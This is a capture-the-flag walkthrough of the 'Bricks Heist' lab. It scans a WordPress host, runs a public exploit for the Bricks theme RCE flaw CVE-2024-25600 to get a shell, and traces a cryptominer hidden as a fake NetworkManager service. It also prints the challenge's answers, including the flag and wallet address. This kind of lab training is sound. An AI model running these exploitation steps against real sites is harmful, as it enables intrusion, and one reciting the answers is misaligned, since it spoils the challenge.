# TryHack3M: Bricks Heist

## Challenge Overview

The challenge provides a **compromised WordPress server** running the Bricks theme.
The goal is to exploit an RCE vulnerability, investigate the compromise, and trace a cryptomining operation.

---

## Exploitation

### Step 1 — Reconnaissance

```bash
nmap -A 10.114.149.18
```

```
22/tcp    SSH     OpenSSH 8.2p1
80/tcp    HTTP    Python http.server
443/tcp   HTTPS   Apache — WordPress 6.5
3306/tcp  MySQL   (unauthorized)
```

Key findings:
- WordPress 6.5 running on port 443
- `/wp-admin/` exposed in `robots.txt`
- Bricks theme detected

### Step 2 — WordPress Enumeration

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

```
WordPress version:  6.5 (insecure)
Theme:              Bricks
Theme version:      1.9.5
```

Bricks 1.9.5 is vulnerable to **CVE-2024-25600** — an unauthenticated Remote Code Execution vulnerability.

### Step 3 — Exploit CVE-2024-25600

We used a public exploit from GitHub:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install rich alive-progress beautifulsoup4 prompt-toolkit
python exploit.py -u https://bricks.thm/
```

This dropped us into a remote shell as `apache`.

### Step 4 — Find the Hidden .txt File

```bash
# ls -la
# cat 650c844110baced87e1606453b93f22a.txt
```

```
THM{fl46_650c844110baced87e1606453b93f22a}
```

✅ Hidden file content: **`THM{fl46_650c844110baced87e1606453b93f22a}`**

---

## Post-Exploitation Investigation

### Step 5 — Find the Suspicious Process

```bash
systemctl list-units --type=service --state=running --no-pager
```

```
ubuntu.service    loaded active running    TRYHACK3M
```

```bash
systemctl status ubuntu.service
```

```
Main PID: 2748 (nm-inet-dialog)
CGroup:
  ├─2748 /lib/NetworkManager/nm-inet-dialog
  └─2749 /lib/NetworkManager/nm-inet-dialog
```

The binary `nm-inet-dialog` is disguised as a legitimate NetworkManager component but is actually a **cryptominer**.

✅ Suspicious process: **`nm-inet-dialog`**
✅ Service name: **`ubuntu.service`**

### Step 6 — Find the Miner Log File

```bash
ls -lah /lib/NetworkManager/
head -n 20 /lib/NetworkManager/inet.conf
```

The log confirms active mining:

```
[*] Status: Mining!
[*] Bitcoin Miner Thread Started
```

✅ Log file: **`inet.conf`**

### Step 7 — Decode the Wallet Address

The log contains a heavily encoded ID field:

```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070...
```

Decoding the hex string through multiple layers of Base64 reveals the Bitcoin wallet address:

✅ Wallet address: **`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`**

### Step 8 — Threat Group Attribution

Searching the wallet address on blockchain analysis tools reveals it has been involved in transactions linked to a known threat group.

---

## Key Takeaway

> **CVE-2024-25600 in Bricks Builder allowed unauthenticated RCE on a WordPress site.** The attacker used this access to install a cryptominer disguised as a legitimate system binary (`nm-inet-dialog`) under a service named `ubuntu.service` — a classic living-off-the-land camouflage technique. Always keep WordPress themes updated and monitor for unexpected system services.
```
